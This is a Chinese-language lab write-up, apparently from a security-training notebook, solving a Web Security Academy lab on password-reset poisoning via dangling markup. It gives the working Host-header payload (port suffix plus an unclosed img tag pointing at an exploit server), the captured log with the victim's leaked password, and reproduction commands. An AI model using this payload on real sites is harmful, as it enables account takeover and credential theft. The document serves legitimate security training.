---
title: "lab-host-header-password-reset-poisoning-via-dangling-markup"
links:
  - target: host-header-family
    relation: evidences
---

# lab-host-header-password-reset-poisoning-via-dangling-markup

> evidences: [[host-header-family]]

- 题面:Password reset poisoning via dangling markup
  (/web-security/host-header/exploiting/password-reset-poisoning/lab-host-header-password-reset-poisoning-via-dangling-markup)
- 实例:https://0a5a00e904c1073e8144f2ed00c60091.web-security-academy.net(wiener:peter)
- 利用服务器:https://exploit-0a8e00fd040c07f8815af1c7011a00c8.exploit-server.net
- 判定目标:毒化 carlos 的重置邮件 → 外带其**新密码** → 登录 carlos;状态:**solved**(solved_check true)

## 关键步

1. `/forgot-password`(csrf+username)的邮件**不含 token 链接**,而是一段 HTML:
   `<p>Please <a href='https://<HOST>/login'>click here</a> to login with your new password: PASSWORD</p>`
   —— 邮件注入点只有 `<HOST>`(Host 头),密码在链接**之后的纯文本**。
2. **Host 覆写的路由陷阱(本批核心发现)**:此 lab 的前端**按 Host 精确路由**。
   - 直接 `Host: exploit-…` / `127.0.0.1` / 大写主机名 → `504 Gateway Timeout (N) connecting to <Host>`
     (前端把 Host 当上游去连,应用根本没跑到;邮箱里也不会出现新邮件)。
   - 只有 `Host: <lab-host>`(精确)才路由到应用。
3. **绕过**:给 Host 加一个**端口**再在端口后拼接 payload —— 前端只按**主机名**路由,而应用把**整个 Host** 拼进邮件链接:
   `Host: 0a5a00e904c1073e8144f2ed00c60091.web-security-academy.net:8443'><img/src="https://exploit-…/?`
   - `:8443` 让前端仍匹配到本 lab(`Host: <lab>:8443` 单独发 → 200);`'` 关掉 href、`>` 关掉 `<a>`,
     再开一个**双引号未闭合**的 `<img/src="https://exploit-…/?`。
4. 产生的邮件 HTML:
   `<a href='https://<lab>:8443'><img/src="https://exploit-…/?/login'>click here</a> to login with your new password: PASSWORD</p>…`
   —— 双引号 `"` 在文档中全篇只出现一次(我们的注入),故 img 的 `src` 一路吞到邮件末尾,密码落在 URL 里。
5. 受害者侧邮件客户端渲染邮件时自动加载 img → 请求打到 exploit server `/log`,
   IP `10.0.4.7` 的 `GET /?/login'>click+here</a>…new+password:+<PASSWORD>…` 就是外带证据。
6. 对 **carlos** 发同样的毒化重置请求 → 从 `/log` 取到 carlos 的新密码 → `/login` 用它登录 → 翻。

## 证据摘录

```
# 毒化重置(carlos);Host 用 <lab>:8443 + 悬垂标记
lab_http post "<lab>/forgot-password" --jar /tmp/b26-jar3.json \
  --header 'Host: 0a5a00e904c1073e8144f2ed00c60091.web-security-academy.net:8443'\''><img/src="https://exploit-0a8e00fd040c07f8815af1c7011a00c8.exploit-server.net/?' \
  --form csrf=<csrf> --form username=carlos          -> 200
lab_http get "https://exploit-…/log"
 -> 10.0.4.7  2026-10-05 19:36:17 +0000 "GET /?/login&apos;&gt;click+here&lt;/a&gt;+to+login+with+your+new+password:+evGkqFZUwr&lt;/p&gt;…" 200
lab_http post "<lab>/login" --jar /tmp/b26-jar3.json --form csrf=<csrf> --form username=carlos --form password=evGkqFZUwr --follow
 -> 302 /my-account?id=carlos  (页面回显 "Your username is: carlos")
solved_check "<lab>/" --jar /tmp/b26-jar3.json -> {"solved":true,"congrats_line":"<h4>Congratulations, you solved the lab!</h4>"}
```

对照组(帮助定性):`Host: <lab-host>`(精确)200 且邮件链接是 lab 主机;`X-Forwarded-Host` /`X-Forwarded-Server` /
`Forwarded: host=…` 均**不改**邮件链接(该应用不吃转发头);`Host: exploit-…`、`Host: 127.0.0.1`、
`Host: <UPPERCASE-HOST>`、`Host: <lab-host>'><img…`(无端口)全部 504 且不产生邮件。

## 复现命令

```
lab_launch launch CC59DB27660D3E229C5A571225AF7FBCB86B736CE42580C13B79DF712F01F9EE \
  --widget-source /web-security/host-header/exploiting/password-reset-poisoning --jar /tmp/b26-jar3.json
lab_http get  "<lab>/forgot-password" --jar JAR                     # 取 csrf
lab_http post "<lab>/forgot-password" --jar JAR --header 'Host: <lab-host>:8443'\''><img/src="https://<exploit>/?' \
  --form csrf=<…> --form username=carlos
lab_http get  "https://<exploit>/log"                               # 取密码
lab_http post "<lab>/login" --jar JAR --form csrf=<…> --form username=carlos --form password=<密码> --follow
```

要点:**Host 端口后拼接 + 单引号破 href + 双引号开启悬垂 img**;双引号全篇唯一是悬垂成立的前提。
